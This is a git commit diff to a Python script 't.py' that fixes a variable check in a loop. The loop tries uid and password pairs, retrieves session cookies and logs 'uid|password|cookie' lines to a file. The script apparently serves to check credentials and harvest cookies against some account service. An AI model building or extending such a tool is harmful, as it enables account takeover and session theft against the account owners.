ba7db37120f31864c9c925a0b51e26521ec3a08c
INC3PTION <91461469+inc-3@users.noreply.github.com>
2024-10-24 23:15:04 +0600

    Update t.py

--- t.py
+++ t.py
@@ -136,7 +136,7 @@ if __name__ == "__main__":
             # Try to extract cookies
             #cookies = inc3_cookies(uid, password)
             cookie = inc3_cookies(uid, password)
-            if token:
+            if cookie:
                 # If token was successfully retrieved, print and log success
                 outfile.write(f"{uid}|{password}|{cookie}\n")
                 print(f"{GREEN}{uid}|{password}|{cookie}{RESET}")  # Print success in green
